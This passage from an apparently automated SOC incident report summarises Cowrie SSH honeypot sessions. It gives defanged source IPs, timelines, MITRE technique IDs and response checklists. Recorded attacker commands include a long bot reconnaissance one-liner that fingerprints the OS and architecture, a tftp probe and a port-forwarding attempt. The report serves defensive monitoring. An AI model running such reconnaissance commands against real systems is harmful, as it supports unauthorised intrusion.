|---|---|
| `2026-08-16 11:20:49` | `cowrie.session.connect` |
| `2026-08-16 11:20:50` | `cowrie.login.success` |
| `2026-08-16 11:20:50` | `cowrie.session.params` |
| `2026-08-16 11:20:50` | `cowrie.log.closed` |
| `2026-08-16 11:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c6a699e9401

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:50` | `cowrie.session.connect` |
| `2026-08-16 11:20:51` | `cowrie.login.success` |
| `2026-08-16 11:20:51` | `cowrie.session.params` |
| `2026-08-16 11:20:51` | `cowrie.log.closed` |
| `2026-08-16 11:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b731974cca22

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:52` | `cowrie.session.connect` |
| `2026-08-16 11:20:52` | `cowrie.login.success` |
| `2026-08-16 11:20:53` | `cowrie.session.params` |
| `2026-08-16 11:20:53` | `cowrie.log.closed` |
| `2026-08-16 11:20:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c237d5e877ea

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:53` | `cowrie.session.connect` |
| `2026-08-16 11:20:53` | `cowrie.login.success` |
| `2026-08-16 11:20:54` | `cowrie.session.params` |
| `2026-08-16 11:20:54` | `cowrie.log.closed` |
| `2026-08-16 11:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e49dd16d0909

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:54` | `cowrie.session.connect` |
| `2026-08-16 11:20:54` | `cowrie.login.success` |
| `2026-08-16 11:20:55` | `cowrie.session.params` |
| `2026-08-16 11:20:55` | `cowrie.log.closed` |
| `2026-08-16 11:20:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d2e376fcc5d

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:55` | `cowrie.session.connect` |
| `2026-08-16 11:20:55` | `cowrie.login.success` |
| `2026-08-16 11:20:56` | `cowrie.session.params` |
| `2026-08-16 11:20:56` | `cowrie.log.closed` |
| `2026-08-16 11:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9640ed6aae1d

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:56` | `cowrie.session.connect` |
| `2026-08-16 11:20:57` | `cowrie.login.success` |
| `2026-08-16 11:20:57` | `cowrie.session.params` |
| `2026-08-16 11:20:57` | `cowrie.log.closed` |
| `2026-08-16 11:20:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23b78993b287

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:57` | `cowrie.session.connect` |
| `2026-08-16 11:20:58` | `cowrie.login.success` |
| `2026-08-16 11:20:58` | `cowrie.session.params` |
| `2026-08-16 11:20:58` | `cowrie.log.closed` |
| `2026-08-16 11:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c945901ac325

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:58` | `cowrie.session.connect` |
| `2026-08-16 11:20:59` | `cowrie.login.success` |
| `2026-08-16 11:20:59` | `cowrie.session.params` |
| `2026-08-16 11:21:00` | `cowrie.log.closed` |
| `2026-08-16 11:21:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f1f1be07452

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:21 |
| **Last Seen** | 2026-08-16 11:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:21:02` | `cowrie.session.connect` |
| `2026-08-16 11:21:02` | `cowrie.client.version` |
| `2026-08-16 11:21:02` | `cowrie.client.kex` |
| `2026-08-16 11:21:02` | `cowrie.login.success` |
| `2026-08-16 11:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-057a5f3422ac

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:21 |
| **Last Seen** | 2026-08-16 11:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `tftp 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:21:02` | `cowrie.session.connect` |
| `2026-08-16 11:21:02` | `cowrie.client.version` |
| `2026-08-16 11:21:02` | `cowrie.client.kex` |
| `2026-08-16 11:21:03` | `cowrie.login.success` |
| `2026-08-16 11:21:03` | `cowrie.session.params` |
| `2026-08-16 11:21:03` | `cowrie.command.input` |
| `2026-08-16 11:21:04` | `cowrie.log.closed` |
| `2026-08-16 11:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03b2673d52ce

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:22 |
| **Last Seen** | 2026-08-16 11:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:22:10` | `cowrie.session.connect` |
| `2026-08-16 11:22:11` | `cowrie.client.version` |
| `2026-08-16 11:22:11` | `cowrie.client.kex` |
| `2026-08-16 11:22:12` | `cowrie.login.success` |
| `2026-08-16 11:22:13` | `cowrie.session.params` |
| `2026-08-16 11:22:13` | `cowrie.command.input` |
| `2026-08-16 11:22:13` | `cowrie.command.input` |
| `2026-08-16 11:22:13` | `cowrie.command.input` |
| `2026-08-16 11:22:13` | `cowrie.command.input` |
| `2026-08-16 11:22:14` | `cowrie.command.input` |
| `2026-08-16 11:22:14` | `cowrie.command.success` |
| `2026-08-16 11:22:14` | `cowrie.command.input` |
| `2026-08-16 11:22:14` | `cowrie.command.input` |
| `2026-08-16 11:22:14` | `cowrie.command.input` |
| `2026-08-16 11:22:14` | `cowrie.command.input` |
| `2026-08-16 11:22:14` | `cowrie.log.closed` |
| `2026-08-16 11:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc01b2ee1ce6

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 11:23 |
| **Last Seen** | 2026-08-16 11:24 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:23:33` | `cowrie.session.connect` |
| `2026-08-16 11:23:38` | `cowrie.client.version` |
| `2026-08-16 11:23:38` | `cowrie.client.kex` |
| `2026-08-16 11:24:01` | `cowrie.login.success` |
| `2026-08-16 11:24:13` | `cowrie.session.params` |
| `2026-08-16 11:24:13` | `cowrie.command.input` |
| `2026-08-16 11:24:19` | `cowrie.log.closed` |
| `2026-08-16 11:24:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ee18a541965

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:23 |
| **Last Seen** | 2026-08-16 11:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:23:36` | `cowrie.session.connect` |
| `2026-08-16 11:23:37` | `cowrie.client.version` |
| `2026-08-16 11:23:37` | `cowrie.client.kex` |
| `2026-08-16 11:23:39` | `cowrie.login.success` |
| `2026-08-16 11:23:40` | `cowrie.session.params` |
| `2026-08-16 11:23:40` | `cowrie.command.input` |
| `2026-08-16 11:23:40` | `cowrie.command.input` |
| `2026-08-16 11:23:40` | `cowrie.command.input` |
| `2026-08-16 11:23:40` | `cowrie.command.input` |
| `2026-08-16 11:23:40` | `cowrie.command.input` |
| `2026-08-16 11:23:40` | `cowrie.command.success` |
| `2026-08-16 11:23:40` | `cowrie.command.input` |
| `2026-08-16 11:23:40` | `cowrie.command.input` |
| `2026-08-16 11:23:40` | `cowrie.command.input` |
| `2026-08-16 11:23:40` | `cowrie.command.input` |
| `2026-08-16 11:23:40` | `cowrie.log.closed` |
| `2026-08-16 11:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d160443c06b5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:25 |
| **Last Seen** | 2026-08-16 11:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:25:05` | `cowrie.session.connect` |
| `2026-08-16 11:25:05` | `cowrie.client.version` |
| `2026-08-16 11:25:05` | `cowrie.client.kex` |
| `2026-08-16 11:25:07` | `cowrie.login.success` |
| `2026-08-16 11:25:08` | `cowrie.session.params` |
| `2026-08-16 11:25:08` | `cowrie.command.input` |
| `2026-08-16 11:25:08` | `cowrie.command.input` |
| `2026-08-16 11:25:08` | `cowrie.command.input` |
| `2026-08-16 11:25:08` | `cowrie.command.input` |
| `2026-08-16 11:25:08` | `cowrie.command.input` |
| `2026-08-16 11:25:08` | `cowrie.command.success` |
| `2026-08-16 11:25:08` | `cowrie.command.input` |
| `2026-08-16 11:25:08` | `cowrie.command.input` |
| `2026-08-16 11:25:08` | `cowrie.command.input` |
| `2026-08-16 11:25:08` | `cowrie.command.input` |
| `2026-08-16 11:25:09` | `cowrie.log.closed` |
| `2026-08-16 11:25:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e83fc719e76

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:26 |
| **Last Seen** | 2026-08-16 11:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:26:32` | `cowrie.session.connect` |
| `2026-08-16 11:26:32` | `cowrie.client.version` |
| `2026-08-16 11:26:32` | `cowrie.client.kex` |
| `2026-08-16 11:26:33` | `cowrie.login.success` |
| `2026-08-16 11:26:35` | `cowrie.session.params` |
| `2026-08-16 11:26:35` | `cowrie.command.input` |
| `2026-08-16 11:26:35` | `cowrie.command.input` |
| `2026-08-16 11:26:35` | `cowrie.command.input` |
| `2026-08-16 11:26:35` | `cowrie.command.input` |
| `2026-08-16 11:26:35` | `cowrie.command.input` |
| `2026-08-16 11:26:35` | `cowrie.command.success` |
| `2026-08-16 11:26:35` | `cowrie.command.input` |
| `2026-08-16 11:26:35` | `cowrie.command.input` |
| `2026-08-16 11:26:35` | `cowrie.command.input` |
| `2026-08-16 11:26:35` | `cowrie.command.input` |
| `2026-08-16 11:26:35` | `cowrie.log.closed` |
| `2026-08-16 11:26:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3906c7023bdb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:27 |
| **Last Seen** | 2026-08-16 11:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:27:59` | `cowrie.session.connect` |
| `2026-08-16 11:28:00` | `cowrie.client.version` |
| `2026-08-16 11:28:00` | `cowrie.client.kex` |
| `2026-08-16 11:28:01` | `cowrie.login.success` |
| `2026-08-16 11:28:03` | `cowrie.session.params` |
| `2026-08-16 11:28:03` | `cowrie.command.input` |
| `2026-08-16 11:28:03` | `cowrie.command.input` |
| `2026-08-16 11:28:03` | `cowrie.command.input` |
| `2026-08-16 11:28:03` | `cowrie.command.input` |
| `2026-08-16 11:28:03` | `cowrie.command.input` |
| `2026-08-16 11:28:03` | `cowrie.command.success` |
| `2026-08-16 11:28:03` | `cowrie.command.input` |
| `2026-08-16 11:28:03` | `cowrie.command.input` |
| `2026-08-16 11:28:03` | `cowrie.command.input` |
| `2026-08-16 11:28:03` | `cowrie.command.input` |
| `2026-08-16 11:28:03` | `cowrie.log.closed` |
| `2026-08-16 11:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7467cbedadb0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-16 11:28 |
| **Last Seen** | 2026-08-16 11:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:28:44` | `cowrie.session.connect` |
| `2026-08-16 11:28:44` | `cowrie.client.version` |
| `2026-08-16 11:28:45` | `cowrie.client.kex` |
| `2026-08-16 11:28:45` | `cowrie.login.success` |
| `2026-08-16 11:28:45` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:28:45` | `cowrie.direct-tcpip.data` |
| `2026-08-16 11:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1ffeafdb6c6

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 11:29 |
| **Last Seen** | 2026-08-16 11:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:29:17` | `cowrie.session.connect` |
| `2026-08-16 11:29:17` | `cowrie.client.version` |
| `2026-08-16 11:29:17` | `cowrie.client.kex` |
| `2026-08-16 11:29:17` | `cowrie.login.success` |
| `2026-08-16 11:29:18` | `cowrie.session.params` |
| `2026-08-16 11:29:18` | `cowrie.command.input` |
| `2026-08-16 11:29:19` | `cowrie.log.closed` |
| `2026-08-16 11:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2391c0cd771

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:29 |
| **Last Seen** | 2026-08-16 11:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:29:26` | `cowrie.session.connect` |
| `2026-08-16 11:29:26` | `cowrie.client.version` |
| `2026-08-16 11:29:26` | `cowrie.client.kex` |
| `2026-08-16 11:29:27` | `cowrie.login.success` |
| `2026-08-16 11:29:29` | `cowrie.session.params` |
| `2026-08-16 11:29:29` | `cowrie.command.input` |
| `2026-08-16 11:29:29` | `cowrie.command.input` |
| `2026-08-16 11:29:29` | `cowrie.command.input` |
| `2026-08-16 11:29:29` | `cowrie.command.input` |
| `2026-08-16 11:29:29` | `cowrie.command.input` |
| `2026-08-16 11:29:29` | `cowrie.command.success` |
| `2026-08-16 11:29:29` | `cowrie.command.input` |
| `2026-08-16 11:29:29` | `cowrie.command.input` |
| `2026-08-16 11:29:29` | `cowrie.command.input` |
| `2026-08-16 11:29:29` | `cowrie.command.input` |
| `2026-08-16 11:29:29` | `cowrie.log.closed` |
| `2026-08-16 11:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0e9582e6a49

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:30 |
| **Last Seen** | 2026-08-16 11:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:30:54` | `cowrie.session.connect` |
| `2026-08-16 11:30:55` | `cowrie.client.version` |
| `2026-08-16 11:30:55` | `cowrie.client.kex` |
| `2026-08-16 11:30:56` | `cowrie.login.success` |
| `2026-08-16 11:30:57` | `cowrie.session.params` |
| `2026-08-16 11:30:57` | `cowrie.command.input` |
| `2026-08-16 11:30:57` | `cowrie.command.input` |
| `2026-08-16 11:30:57` | `cowrie.command.input` |
| `2026-08-16 11:30:57` | `cowrie.command.input` |
